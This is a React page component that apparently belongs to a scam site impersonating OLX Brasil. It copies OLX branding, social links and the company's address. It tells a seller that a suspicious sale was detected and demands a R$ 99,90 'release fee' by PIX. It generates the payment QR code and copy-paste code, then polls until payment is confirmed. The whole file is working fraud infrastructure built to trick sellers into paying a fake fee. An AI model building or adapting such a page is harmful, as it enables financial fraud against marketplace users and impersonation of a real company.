import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { AlertCircle, CheckCircle2, Copy, Check } from "lucide-react";
import { useState, useEffect, useRef } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function Home() {
  let { user, loading, error, isAuthenticated, logout } = useAuth();

  const [qrCode, setQrCode] = useState<string | null>(null);
  const [copyPaste, setCopyPaste] = useState<string | null>(null);
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [showQrCode, setShowQrCode] = useState(false);
  const [copied, setCopied] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<string | null>(null);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const utils = trpc.useUtils();

  const createDeposit = trpc.payment.createDeposit.useMutation({
    onSuccess: (data) => {
      if (data.qrcodeUrl || data.copyPaste) {
        // QR Code pode vir em base64 puro ou com prefixo "base64:"
        let qrSrc = data.qrcodeUrl ?? null;
        if (qrSrc && !qrSrc.startsWith("http") && !qrSrc.startsWith("data:")) {
          // remove prefixo "base64:" se existir
          const base64Data = qrSrc.replace(/^base64:/, "");
          qrSrc = `data:image/png;base64,${base64Data}`;
        }
        setQrCode(qrSrc);
        setCopyPaste(data.copyPaste ?? null);
        setTransactionId(data.transactionId ?? null);
        setShowQrCode(true);
        toast.success("QR Code gerado com sucesso!");
      } else {
        toast.error("QR Code não retornado pela gateway. Verifique os logs do servidor.");
      }
    },
    onError: (error) => {
      console.error("Erro ao processar pagamento:", error);
      toast.error(`Erro ao gerar QR Code: ${error.message}`);
    },
  });

  // Polling de status a cada 5s após gerar o QR
  useEffect(() => {
    if (!transactionId || paymentStatus === "COMPLETO") return;

    pollingRef.current = setInterval(async () => {
      try {
        const result = await utils.payment.checkStatus.fetch({ transactionId });
        const state = result?.transaction?.transactionState ?? result?.status ?? null;
        if (state) setPaymentStatus(state);
        if (state === "COMPLETO" || state === "DEPOSITO_COMPLETO") {
          setPaymentStatus("COMPLETO");
          clearInterval(pollingRef.current!);
          toast.success("Pagamento confirmado! ✅");
        }
      } catch (e) {
        // silencioso — não interrompe o fluxo
      }
    }, 5000);

    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [transactionId]);

  const handlePayment = () => {
    createDeposit.mutate({
      amount: 99.90,
      description: "Taxa de Liberação de Venda - OLX",
      payerName: "Cliente OLX",
      payerDocument: "00000000000",
    });
  };

  const handleCopy = () => {
    if (!copyPaste) return;
    navigator.clipboard.writeText(copyPaste);
    setCopied(true);
    toast.success("Código copiado!");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="border-b border-gray-100 bg-white py-4">
        <div className="container flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img
              src="/logo.png"
              alt="OLX Logo"
              className="h-16 w-auto"
            />
          </div>
          <div className="text-sm text-gray-500">Segurança em Primeiro Lugar</div>
        </div>
      </header>

      <main className="container py-12 md:py-20 flex-1">
        <div className="max-w-2xl mx-auto">

          {/* Alert Section */}
          <div
            className="mb-8 rounded-xl border border-purple-200 bg-gradient-to-br from-purple-50 to-white p-8 shadow-sm"
            style={{
              backgroundImage:
                "url('https://d2xsxph8kpxj0f.cloudfront.net/310519663441581444/7FJVf6Jr7VmFWC5MGHd2gK/olx-alert-pattern-jA7QfvZGTdWLRYrinB8AmV.webp')",
              backgroundSize: "cover",
              backgroundPosition: "center",
            }}
          >
            <div className="flex gap-4">
              <div className="flex-shrink-0">
                <div className="flex h-12 w-12 items-center justify-center rounded-lg bg-purple-100">
                  <AlertCircle className="h-6 w-6 text-purple-600" />
                </div>
              </div>
              <div className="flex-1">
                <h1 className="mb-2 text-2xl font-bold text-gray-900">
                  Venda Suspeita Identificada
                </h1>
                <p className="text-gray-700 leading-relaxed">
                  Detectamos uma atividade incomum na sua venda. Para sua segurança e proteção, é
                  necessário liberar o valor através de uma verificação adicional.
                </p>
              </div>
            </div>
          </div>

          {/* Details Section */}
          <div className="mb-8 rounded-xl border border-gray-200 bg-white p-8 shadow-sm">
            <h2 className="mb-6 text-lg font-semibold text-gray-900">Detalhes da Liberação</h2>
            <div className="space-y-4">
              <div className="flex items-center justify-between pb-4 border-b border-gray-100">
                <div>
                  <p className="text-sm text-gray-600">Taxa de Liberação</p>
                  <p className="text-gray-900 font-medium">Verificação de Segurança</p>
                </div>
                <div className="text-right">
                  <p className="text-2xl font-bold text-purple-600">R$ 99,90</p>
                  <p className="text-xs text-gray-500 mt-1">Pagamento único</p>
                </div>
              </div>
              <div className="flex items-center justify-between pb-4 border-b border-gray-100">
                <div>
                  <p className="text-sm text-gray-600">Tipo de Verificação</p>
                  <p className="text-gray-900 font-medium">Validação Avançada</p>
                </div>
                <div className="flex items-center gap-2">
                  <div className="h-2 w-2 rounded-full bg-green-500"></div>
                  <span className="text-sm text-green-600 font-medium">Ativa</span>
                </div>
              </div>
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-gray-600">Status da Venda</p>
                  <p className="text-gray-900 font-medium">Aguardando Liberação</p>
                </div>
                <div className="flex items-center gap-2">
                  <div className="h-2 w-2 rounded-full bg-yellow-500"></div>
                  <span className="text-sm text-yellow-600 font-medium">Pendente</span>
                </div>
              </div>
            </div>
          </div>

          {/* Security Info */}
          <div className="mb-8 rounded-lg bg-gray-50 p-6 border border-gray-200">
            <div className="flex gap-3">
              <img
                src="https://d2xsxph8kpxj0f.cloudfront.net/310519663441581444/7FJVf6Jr7VmFWC5MGHd2gK/olx-security-icon-WESDq9dzcbxRUMFtZ7ZNpR.webp"
                alt="Segurança"
                className="h-6 w-6 flex-shrink-0"
              />
              <div>
                <h3 className="text-sm font-semibold text-gray-900 mb-1">Por que essa verificação?</h3>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Protegemos seus dados e garantimos transações seguras. Esta verificação ajuda a prevenir fraudes e
                  proteger sua conta.
                </p>
              </div>
            </div>
          </div>

          {/* QR Code Section */}
          {showQrCode && (
            <div className="mb-8 rounded-xl border border-green-200 bg-green-50 p-8 shadow-sm">
              <h2 className="mb-6 text-lg font-semibold text-gray-900">
                {paymentStatus === "COMPLETO" ? "✅ Pagamento Confirmado!" : "Escanear QR Code para Pagar"}
              </h2>

              {paymentStatus === "COMPLETO" ? (
                <div className="flex flex-col items-center gap-4 py-6">
                  <CheckCircle2 className="h-16 w-16 text-green-500" />
                  <p className="text-green-700 font-semibold text-lg">Pagamento recebido com sucesso!</p>
                  <p className="text-gray-500 text-sm">Sua venda será liberada em instantes.</p>
                </div>
              ) : (
                <div className="flex flex-col items-center gap-6">
                  {/* QR Code */}
                  {qrCode && (
                    <div className="bg-white p-4 rounded-lg border border-gray-200 shadow-sm">
                      <img
                        src={qrCode}
                        alt="QR Code PIX"
                        className="w-52 h-52"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = "none";
                        }}
                      />
                    </div>
                  )}

                  {/* Copy Paste */}
                  {copyPaste && (
                    <div className="w-full">
                      <p className="text-sm text-gray-600 mb-2 font-medium">PIX Copia e Cola:</p>
                      <div className="flex gap-2">
                        <input
                          type="text"
                          value={copyPaste}
                          readOnly
                          className="flex-1 px-4 py-2 border border-gray-300 rounded-lg text-sm bg-white text-gray-900 font-mono"
                        />
                        <Button
                          onClick={handleCopy}
                          className={`flex items-center gap-2 ${copied ? "bg-green-600 hover:bg-green-700" : "bg-purple-600 hover:bg-purple-700"} text-white`}
                        >
                          {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                          {copied ? "Copiado!" : "Copiar"}
                        </Button>
                      </div>
                    </div>
                  )}

                  {/* Status de polling */}
                  <div className="flex items-center gap-2 text-sm text-gray-500">
                    <div className="h-2 w-2 rounded-full bg-yellow-400 animate-pulse"></div>
                    Aguardando confirmação do pagamento...
                  </div>

                  {/* Transaction ID */}
                  {transactionId && (
                    <p className="text-xs text-gray-400">
                      ID: <span className="font-mono">{transactionId}</span>
                    </p>
                  )}
                </div>
              )}
            </div>
          )}

          {/* CTA Button */}
          {!showQrCode && (
            <div className="space-y-4">
              <Button
                onClick={handlePayment}
                disabled={createDeposit.isPending}
                className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
              >
                {createDeposit.isPending ? (
                  <div className="flex items-center gap-2">
                    <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Gerando QR Code...
                  </div>
                ) : (
                  "Liberar Valor - R$ 99,90"
                )}
              </Button>
              <p className="text-center text-xs text-gray-500">
                Ao continuar, você concorda com nossos{" "}
                <a href="#" className="text-purple-600 hover:underline">
                  Termos de Serviço
                </a>
              </p>
            </div>
          )}

          {/* Footer */}
          <div className="mt-12 pt-8 border-t border-gray-200">
            <div className="grid grid-cols-2 gap-6 md:grid-cols-3 mb-8">
              <div>
                <p className="text-xs text-gray-500 uppercase tracking-wide mb-2">Suporte</p>
                <a href="#" className="text-sm text-purple-600 hover:underline">Central de Ajuda</a>
              </div>
              <div>
                <p className="text-xs text-gray-500 uppercase tracking-wide mb-2">Segurança</p>
                <a href="#" className="text-sm text-purple-600 hover:underline">Política de Privacidade</a>
              </div>
              <div>
                <p className="text-xs text-gray-500 uppercase tracking-wide mb-2">Contato</p>
                <a href="#" className="text-sm text-purple-600 hover:underline">Fale Conosco</a>
              </div>
            </div>

            {/* Redes Sociais */}
            <div className="flex items-center justify-center gap-5 mb-8">
              <a href="https://www.facebook.com/olxbrasil" target="_blank" rel="noreferrer" className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fillRule="evenodd" d="M9.21567432,22.9090909 L9.21567432,12.4532258 L7,12.4532258 L7,8.85048541 L9.21567432,8.85048541 L9.21567432,6.68752152 C9.21567432,3.74858277 10.4660977,2 14.0209307,2 L16.9796789,2 L16.9796789,5.60406004 L15.1304613,5.60406004 C13.7465962,5.60406004 13.6551514,6.10751991 13.6551514,7.04713571 L13.6490551,8.85048541 L17,8.85048541 L16.6078033,12.4532258 L13.6490551,12.4532258 L13.6490551,22.9090909 L9.21567432,22.9090909 Z" fill="currentColor"/></svg>
              </a>
              <a href="https://www.youtube.com/user/OLXBrasil" target="_blank" rel="noreferrer" className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path fillRule="evenodd" clipRule="evenodd" d="M21.18 15.6c0 3.12-3.13 3.12-3.13 3.12H6.13C3 18.72 3 15.6 3 15.6V9.12C3 6 6.13 6 6.13 6h11.92c3.13 0 3.13 3.12 3.13 3.12v6.48Zm-5.56-3.23L9.67 8.88v6.97l5.95-3.48Z" fill="currentColor"/></svg>
              </a>
              <a href="https://www.tiktok.com/@olx_brasil" target="_blank" rel="noreferrer" className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M11.5 1H15.75C15.75 3.211 18.8759 5.4 20 5.4V9.8C18.7144 9.8 17.1695 9.21514 15.75 8.22734V16.4C15.75 20.0388 12.8898 23 9.375 23C5.86025 23 3 20.0388 3 16.4C3 12.7612 5.86025 9.8 9.375 9.8V14.2C8.202 14.2 7.25 15.1878 7.25 16.4C7.25 17.6122 8.202 18.6 9.375 18.6C10.548 18.6 11.5 17.6122 11.5 16.4V1Z" fill="currentColor"/></svg>
              </a>
              <a href="https://instagram.com/olxbr" target="_blank" rel="noreferrer" className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fillRule="evenodd" d="M12,2 C14.717,2 15.056,2.01 16.122,2.06 C17.187,2.11 17.912,2.278 18.55,2.525 C19.21,2.779 19.766,3.123 20.322,3.678 C20.877,4.232 21.221,4.788 21.475,5.45 C21.722,6.087 21.89,6.813 21.94,7.878 C21.987,8.944 22,9.283 22,12 C22,14.717 21.99,15.056 21.94,16.122 C21.89,17.187 21.722,17.912 21.475,18.55 C21.221,19.21 20.877,19.766 20.322,20.322 C19.768,20.877 19.21,21.221 18.55,21.475 C17.913,21.722 17.187,21.89 16.122,21.94 C15.056,21.987 14.717,22 12,22 C9.283,22 8.944,21.99 7.878,21.94 C6.813,21.89 6.088,21.722 5.45,21.475 C4.79,21.221 4.232,20.877 3.678,20.322 C3.123,19.768 2.779,19.21 2.525,18.55 C2.277,17.913 2.11,17.187 2.06,16.122 C2.013,15.056 2,14.717 2,12 C2,9.283 2.01,8.944 2.06,7.878 C2.11,6.813 2.277,6.088 2.525,5.45 C2.779,4.79 3.123,4.232 3.678,3.678 C4.232,3.123 4.79,2.779 5.45,2.525 C6.088,2.277 6.813,2.11 7.878,2.06 C8.944,2.013 9.283,2 12,2 Z M12,7 C9.239,7 7,9.239 7,12 C7,14.761 9.239,17 12,17 C14.761,17 17,14.761 17,12 C17,9.239 14.761,7 12,7 Z M12,15 C10.343,15 9,13.657 9,12 C9,10.343 10.343,9 12,9 C13.657,9 15,10.343 15,12 C15,13.657 13.657,15 12,15 Z M18.5,6.5 C18.5,7.328 17.828,8 17,8 C16.172,8 15.5,7.328 15.5,6.5 C15.5,5.672 16.172,5 17,5 C17.828,5 18.5,5.672 18.5,6.5 Z" fill="currentColor"/></svg>
              </a>
              <a href="https://twitter.com/olx_Brasil" target="_blank" rel="noreferrer" className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.261 5.632 5.903-5.632Zm-1.161 17.52h1.833L7.084 4.126H5.117z" fill="currentColor"/></svg>
              </a>
              <a href="https://www.linkedin.com/company/olx-brasil" target="_blank" rel="noreferrer" className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path fillRule="evenodd" clipRule="evenodd" d="M3.46 8.83H7v12.34H3.46V8.83Zm1.68-1.55h-.03A2.05 2.05 0 0 1 3 5.14C3 3.92 3.86 3 5.16 3c1.31 0 2.12.92 2.14 2.14 0 1.2-.83 2.14-2.16 2.14Zm16.04 13.89h-4.02v-6.39c0-1.67-.63-2.81-2-2.81-1.06 0-1.65.77-1.93 1.51-.1.27-.08.64-.08 1.01v6.68H9.17s.05-11.32 0-12.34h3.98v1.93c.23-.84 1.5-2.05 3.53-2.05 2.52 0 4.5 1.77 4.5 5.6v6.86Z" fill="currentColor"/></svg>
              </a>
            </div>

            <div className="border-t border-gray-200 pt-8">
              <div className="text-xs text-gray-500 text-center">
                © Bom Negócio Atividades de Internet Ltda. - Rua do Catete, 359, Flamengo - 22220-001 - Rio de Janeiro, RJ
              </div>

            </div>
          </div>

        </div>
      </main>
    </div>
  );
}
